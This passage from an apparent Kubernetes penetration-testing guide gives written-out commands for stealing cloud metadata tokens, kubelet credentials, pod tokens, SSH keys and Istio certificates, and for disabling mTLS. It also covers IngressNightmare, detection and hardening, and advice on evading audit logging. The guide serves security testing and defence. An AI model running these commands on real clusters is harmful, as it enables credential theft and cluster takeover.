# - Sometimes overly broad permissions (s3:*, etc.)
```

#### GKE (Google Cloud) - Workload Identity Abuse

```bash
# GKE Workload Identity maps K8s SAs to GCP service accounts

# Step 1: Check if Workload Identity is configured
kubectl get sa <service-account> -o json | jq '.metadata.annotations["iam.gke.io/gcp-service-account"]'

# Step 2: Obtain GCP access token from metadata server
curl -s -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"

# Step 3: Use the token to access GCP APIs
TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token" | jq -r '.access_token')

# List GCS buckets
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://storage.googleapis.com/storage/v1/b?project=<project-id>"

# Access Secret Manager
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://secretmanager.googleapis.com/v1/projects/<project-id>/secrets"

# Node default service account (if no Workload Identity):
# GKE nodes use a GCP service account with compute.instances.* permissions
# This is often the default compute service account with editor role

# Metadata concealment check:
curl -s -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/attributes/kube-env"
# If accessible, contains kubelet credentials and cluster CA
```

#### AKS (Azure) - Managed Identity Abuse

```bash
# AKS uses Azure Managed Identities (User or System Assigned)
# Pods can inherit the node's managed identity via metadata service

# Step 1: Check for managed identity
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | jq .

# Step 2: Use the token for Azure API access
TOKEN=$(curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | jq -r '.access_token')

# List resources in the subscription
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions?api-version=2020-01-01"

# Access Key Vault
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://<vault-name>.vault.azure.net/secrets?api-version=7.3"

# AKS Managed Identity commonly has:
# - Contributor role on the MC_ resource group
# - Network Contributor on the VNet
# - AcrPull on container registries
# These can be leveraged for lateral movement in Azure

# Azure AD Pod Identity (deprecated but still in use):
# Uses CRDs (AzureIdentity, AzureIdentityBinding) to assign identities
kubectl get azureidentities --all-namespaces
kubectl get azureidentitybindings --all-namespaces
# Check for overly broad label selectors that allow any pod
# to assume the identity
```

---

### 12. Lateral Movement in Kubernetes

Once an attacker gains initial access to a single pod, lateral movement through the cluster follows predictable patterns.

#### Pod-to-Pod Movement

```bash
# Step 1: Discover other pods and services
# Using Kubernetes DNS:
nslookup kubernetes.default.svc.cluster.local
# Scan for services:
for svc in $(kubectl get svc --all-namespaces -o jsonpath='{range .items[*]}{.spec.clusterIP}{" "}{end}'); do
  curl -s --connect-timeout 1 http://$svc 2>/dev/null | head -1
done

# Using environment variables (every service creates env vars):
env | grep _SERVICE_HOST | sort

# Step 2: Access other pods directly
# Pod IPs are routable within the cluster
kubectl get pods -o wide  # Get pod IPs
curl http://<pod-ip>:<port>

# Step 3: Exploit application vulnerabilities
# Common targets:
# - Redis (port 6379, often no auth)
# - MongoDB (port 27017, often no auth)
# - Elasticsearch (port 9200, often no auth)
# - PostgreSQL (port 5432)
# - Internal APIs without authentication
```

#### Namespace Traversal

```bash
# Kubernetes namespaces are NOT security boundaries by default
# They're organizational units unless enforced by NetworkPolicies

# Step 1: List all namespaces
kubectl get namespaces

# Step 2: Check access in each namespace
for ns in $(kubectl get ns -o jsonpath='{.items[*].metadata.name}'); do
  echo "=== Namespace: $ns ==="
  kubectl auth can-i --list -n $ns 2>/dev/null | grep -v "no"
done

# Step 3: High-value namespaces to target:
# - kube-system: Control plane components, cluster admin secrets
# - monitoring: Prometheus, Grafana (may have dashboard access)
# - logging: ELK/EFK stack (may contain sensitive log data)
# - istio-system: Service mesh control plane, TLS certificates
# - cert-manager: TLS certificate management, signing keys
# - vault: HashiCorp Vault (secrets management)
# - argocd/flux-system: GitOps controllers (repo credentials)
```

#### Node-Level Access

```bash
# From a compromised pod with hostPath or node access:

# Step 1: Access kubelet configuration
cat /host/var/lib/kubelet/config.yaml
cat /host/var/lib/kubelet/kubeconfig
# Contains kubelet credentials for API server authentication

# Step 2: Use kubelet credentials
export KUBECONFIG=/host/var/lib/kubelet/kubeconfig
kubectl get nodes  # Kubelet has limited but useful permissions
kubectl get pods -A  # Can list pods on its node

# Step 3: Access all pod tokens on the node
find /host/var/lib/kubelet/pods -name "token" -path "*/serviceaccount/*" \
  -exec sh -c 'echo "=== {} ==="; cat {}' \;

# Step 4: Pivot to other nodes
# Using SSH keys found on the node:
cat /host/root/.ssh/id_rsa
ssh -i /host/root/.ssh/id_rsa <other-node-ip>

# Using node-to-node trust (same cluster CA):
# Kubelet certificates are signed by the cluster CA
# Can be used to authenticate to kubelet on other nodes
```

#### Service Mesh Exploitation

```bash
# Istio/Linkerd service meshes add mTLS between pods
# But compromise of the mesh control plane is devastating

# Istio-specific attacks:
# 1. Access istiod (control plane)
kubectl -n istio-system get svc istiod
# istiod has cluster-admin level access and generates certificates

# 2. Steal Istio certificates
# Istio injects certs as env vars or volumes
ls /etc/certs/  # Or /etc/istio/proxy/
cat /etc/certs/cert-chain.pem
cat /etc/certs/key.pem

# 3. Impersonate other services using stolen certs
# Or disable mTLS for a namespace:
cat <<EOF | kubectl apply -f -
apiVersion: security.istio.io/v1beta1
kind: PeerAuthentication
metadata:
  name: disable-mtls
  namespace: target-namespace
spec:
  mtls:
    mode: DISABLE
EOF

# 4. Modify Istio VirtualService for traffic manipulation
# Redirect traffic to attacker-controlled service
```

---

### 13. Kubernetes CVEs 2025-2026

#### IngressNightmare (March 2025) - CVE-2025-1974, CVE-2025-1097, CVE-2025-1098, CVE-2025-24514

```bash
# CVSS: 9.8 (Critical)
# Affects: Ingress-NGINX Controller < 1.12.1 and < 1.11.5
# Impact: Unauthenticated RCE leading to complete cluster takeover

# The IngressNightmare vulnerability chain:
# 1. Attacker sends a large HTTP request to NGINX, which buffers it to disk
#    as a temporary file (this is the malicious shared library .so file)
# 2. The file is "deleted" but remains accessible via /proc/<pid>/fd/<fd>
# 3. Attacker crafts a malicious Ingress object with annotation injection:
#    - CVE-2025-1097: auth-tls-match-cn annotation injection
#    - CVE-2025-1098: mirror-target/mirror-host annotation injection
#    - CVE-2025-24514: auth-url annotation injection
# 4. The injected NGINX config includes ssl_engine directive pointing to
#    the uploaded .so file via /proc/self/fd/<N>
# 5. During config validation, NGINX loads the .so, executing attacker code

# Requirements:
# - Network access to the Ingress-NGINX admission controller
#   (typically on port 443 within the cluster network)
# - Ability to create or modify Ingress resources (or SSRF to admission endpoint)

# Discovery:
# Check if ingress-nginx is installed
kubectl get pods -n ingress-nginx
kubectl get svc -n ingress-nginx
# Check version
kubectl exec -n ingress-nginx <controller-pod> -- /nginx-ingress-controller --version

# Impact:
# The ingress-nginx controller by default has access to ALL Secrets
# cluster-wide (to handle TLS certificates for any Ingress).
# RCE on the controller = access to all cluster secrets = cluster takeover

# Remediation:
# Upgrade to Ingress-NGINX Controller v1.12.1+ or v1.11.5+
# Restrict network access to the admission controller webhook
# Remove the webhook if not needed:
kubectl delete validatingwebhookconfigurations ingress-nginx-admission
```

#### CVE-2025-1767: GitRepo Volume Cross-Pod Access (March 2025)

```bash
# CVSS: 6.5 (Medium)
# Affects: All Kubernetes versions using in-tree gitRepo volume
# Impact: Cross-pod data access on the same node

# The gitRepo volume type (deprecated but enabled by default) can be
# exploited to access git repositories cloned by other pods on the
# same node.

# Exploitation:
# Create a pod with a gitRepo volume that references a local path
# instead of a remote git repository, accessing data from other pods

# Mitigation:
# Use init containers for git clone operations instead of gitRepo volumes
# Restrict gitRepo volume usage via ValidatingAdmissionPolicy
# Apply the Restricted pod security standard
```

#### Additional 2025 Kubernetes Security Issues

```bash
# CVE-2025-15467 (January 2026): Kubernetes API server vulnerability
# CVE-2025-39964 (January 2026): Kubernetes cluster security bypass
# CVE-2025-40215, CVE-2025-40214 (January 2026): Additional K8s CVEs
# CVE-2025-39965 (December 2025): Kubernetes security advisory

# Kubernetes Security Features Going Stable in 2025:
# - Structured Authorization Configuration (KEP-3221): GA in v1.32
#   Allows configuring multiple authorizers with fine-grained rules
# - Reduction of Secret-based SA Tokens (KEP-2799): GA in v1.32
#   Auto-cleanup of legacy long-lived tokens
# - AppArmor support: GA in v1.31
#   First-class AppArmor profile support in pod security context

# 2026 Preview from CNCF:
# - Pod-level security context (KEP-2170)
# - Improved user namespace support
# - Container-level resource limits enforcement
# - Enhanced audit logging capabilities
```

---

## 2025 Techniques

### IngressNightmare: The Biggest K8s Vulnerability of 2025

The IngressNightmare disclosure in March 2025 was the most significant Kubernetes security event of the year. Wiz Research discovered that four vulnerabilities in the Ingress-NGINX Controller could be chained to achieve unauthenticated remote code execution from the pod network. The attack leveraged NGINX's default behavior of buffering large HTTP request bodies to disk, combined with annotation injection in Ingress objects, to upload and execute a malicious shared library within the controller pod. Since the ingress-nginx controller has default access to all Secrets cluster-wide (needed for TLS certificate handling), this RCE effectively grants cluster-admin equivalent access.

### Stratus Red Team and KubeHound

The red team tooling ecosystem for Kubernetes matured significantly in 2024-2025:

- **Stratus Red Team** (by DataDog): Provides granular, atomic attack techniques mapped to MITRE ATT&CK for Kubernetes, including credential access via service account token theft, persistence via backdoored ClusterRoles, and privilege escalation via pod creation.

- **KubeHound** (by DataDog): Attack graph tool that models all possible attack paths in a Kubernetes cluster, identifying transitive privilege escalation chains that are invisible to traditional RBAC auditing.

- **Konstellation** (by Praetorian): Specialized tool for "RBACpacking" -- analyzing RBAC configurations to identify the minimal set of permissions needed to achieve cluster compromise.

### Shift to Pod Identity and Short-Lived Tokens

AWS announced that EKS Pod Identity is the recommended replacement for IRSA (IAM Roles for Service Accounts). Pod Identity uses a node-level agent rather than OIDC federation, reducing the attack surface of trust policy misconfigurations. However, during the migration period (2025-2026), many clusters run both IRSA and Pod Identity, creating hybrid attack surfaces where both token theft vectors are available.

Kubernetes 1.32 (2025) graduated the automatic cleanup of legacy long-lived service account tokens to GA, significantly reducing the window for token theft attacks on clusters running the latest version.

---

## Detection & Defense

### Kubernetes Audit Logging

```yaml
# Recommended audit policy for security monitoring
apiVersion: audit.k8s.io/v1
kind: Policy
rules:
# Log all requests to secrets
- level: Metadata
  resources:
  - group: ""
    resources: ["secrets"]

# Log pod exec/attach (container administration commands)
- level: RequestResponse
  resources:
  - group: ""
    resources: ["pods/exec", "pods/attach", "pods/portforward"]

# Log RBAC changes
- level: RequestResponse
  resources:
  - group: "rbac.authorization.k8s.io"
    resources: ["clusterroles", "clusterrolebindings", "roles", "rolebindings"]

# Log service account token creation
- level: Metadata
  resources:
  - group: ""
    resources: ["serviceaccounts/token"]

# Log privileged pod creation
- level: RequestResponse
  resources:
  - group: ""
    resources: ["pods"]
  verbs: ["create", "update", "patch"]

# Log node proxy requests
- level: RequestResponse
  resources:
  - group: ""
    resources: ["nodes/proxy"]

# Catch-all for other requests
- level: Metadata
```

### Detection Queries

```bash
# Detect cluster-admin binding creation
# In audit logs, look for:
# resource: clusterrolebindings
# verb: create
# requestObject.roleRef.name: cluster-admin

# Detect secret access from unusual service accounts
# In audit logs, look for:
# resource: secrets
# verb: get/list/watch
# user.username: system:serviceaccount:<ns>:<sa>
# where <sa> is not expected to access secrets

# Detect exec into pods (potential container administration)
# resource: pods/exec
# verb: create

# Detect service account token requests
# resource: serviceaccounts/token
# verb: create

# Detect privileged pod creation (use OPA/Gatekeeper or Kyverno)
# Look for pods with:
# - securityContext.privileged: true
# - hostNetwork/hostPID/hostIPC: true
# - hostPath volumes
# - capabilities.add containing SYS_ADMIN
```

### Hardening Recommendations

```bash
# 1. Enable RBAC and disable ABAC
# Verify: --authorization-mode=RBAC (not ABAC)

# 2. Disable anonymous authentication
# API server: --anonymous-auth=false
# Kubelet: --anonymous-auth=false

# 3. Enable audit logging
# API server: --audit-policy-file=/etc/kubernetes/audit-policy.yaml
#             --audit-log-path=/var/log/kubernetes/audit.log

# 4. Use Pod Security Admission
kubectl label namespace <ns> \
  pod-security.kubernetes.io/enforce=restricted \
  pod-security.kubernetes.io/warn=restricted \
  pod-security.kubernetes.io/audit=restricted

# 5. Enable encryption at rest for etcd
# API server: --encryption-provider-config=/etc/kubernetes/encryption-config.yaml

# 6. Use NetworkPolicies (default deny)
cat <<EOF | kubectl apply -f -
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-all
  namespace: default
spec:
  podSelector: {}
  policyTypes:
  - Ingress
  - Egress
EOF

# 7. Disable automounting of service account tokens
# Set automountServiceAccountToken: false on service accounts
# and pod specs that don't need API access

# 8. Use short-lived tokens (projected volumes)
# Kubernetes 1.20+ uses projected tokens by default for new clusters

# 9. Restrict kubelet permissions
# --authorization-mode=Webhook (not AlwaysAllow)
# --read-only-port=0 (disable port 10255)

# 10. Block metadata service access
# Use NetworkPolicies to block 169.254.169.254
# Or use cloud-provider metadata concealment features

# 11. Enable node restriction admission
# API server: --enable-admission-plugins=NodeRestriction
# Prevents nodes from modifying other nodes' objects

# 12. Regular RBAC audit
# Use tools: kubectl-who-can, rakkess, rbac-tool, Konstellation
kubectl who-can get secrets --all-namespaces
kubectl who-can create pods --all-namespaces
```

---

## OPSEC Considerations

### For Red Team Operators

1. **API Audit Logs**: The Kubernetes API server logs every request with user identity, source IP, resource, verb, and response code. Assume all kubectl and API operations are logged. Review the audit policy to understand what level of detail is captured.

2. **Service Account Attribution**: All actions performed with a service account token are attributed to that service account. Using a production service account for reconnaissance may trigger alerts. Consider:
   - Using service accounts that normally perform similar operations
   - Operating during maintenance windows when API activity is high
   - Minimizing the number of API calls (batch operations)

3. **Namespace Selection**: Target namespaces that are less monitored. `kube-system` is often heavily monitored, while development or testing namespaces may have less scrutiny but still useful privileges.

4. **Tool Selection**: kubectl is the most recognizable tool in audit logs. Consider using:
   - Direct API calls via curl (harder to fingerprint)
   - Language-specific client libraries (Go, Python)
   - Tools that mimic normal cluster operations (ArgoCD, Helm)

5. **Token Hygiene**: When stealing service account tokens, prefer projected (short-lived) tokens as they have built-in expiration. Store exfiltrated tokens securely and destroy them after use.

6. **Avoid Cluster-Wide Operations**: Operations like `kubectl get secrets --all-namespaces` generate many audit events. Instead, target specific namespaces and resources based on reconnaissance.

7. **Pod Cleanup**: Delete any attacker-created pods promptly. Long-running suspicious pods will be detected by security teams, runtime security tools, and cost monitoring.

8. **Network Awareness**: In-cluster network traffic may be monitored by service meshes, eBPF-based tools (Cilium, Calico), or traditional IDS. Use encrypted channels and avoid scanning wide IP ranges.

---

## Cross-References

- [Container Escapes](container-escapes.md) - Techniques for escaping from a compromised container to the host node
- [Cloud Security Overview](../README.md) - Broader cloud attack surface context

---

## References

### CVEs and Advisories
- CVE-2025-1974: IngressNightmare - Unauthenticated RCE in Ingress-NGINX (CVSS 9.8)
- CVE-2025-1097, CVE-2025-1098, CVE-2025-24514, CVE-2025-24513: IngressNightmare annotation injection chain
- CVE-2025-1767: GitRepo Volume Inadvertent Local Repository Access
- CVE-2025-15467, CVE-2025-39964, CVE-2025-40215, CVE-2025-40214, CVE-2025-39965: 2025-2026 Kubernetes security advisories

### Tools
- Stratus Red Team: https://stratus-red-team.cloud/attack-techniques/kubernetes/
- KubeHound: https://github.com/DataDog/KubeHound
- Konstellation: https://github.com/praetorian-inc/konstellation
- PEIRATES: https://github.com/inguardians/peirates
- kube-hunter: https://github.com/aquasecurity/kube-hunter
- kubeletctl: https://github.com/cyberark/kubeletctl
- kubectl-who-can: https://github.com/aquasecurity/kubectl-who-can
- rbac-tool: https://github.com/alcideio/rbac-tool
- kubeaudit: https://github.com/Shopify/kubeaudit

### Research and Blogs
- Wiz Blog: IngressNightmare - CVE-2025-1974 (March 2025)
- ProjectDiscovery: IngressNightmare Unauth RCE Analysis
- CNCF Blog: Kubernetes Security 2025 Stable Features and 2026 Preview
- CyberArk: Kubernetes Pentest Methodology Parts 1-3
- Palo Alto Unit 42: Mitigating RBAC-Based Privilege Escalation
- NCC Group: Post-Exploiting a Compromised etcd
- Praetorian: Introducing Konstellation for RBACpacking
- Aqua Security: Kubernetes Exposed - Exploiting the Kubelet API
- RBT Security: Kubernetes Penetration Testing Series
- Datadog Security Labs: IngressNightmare Vulnerabilities Overview and Remediation
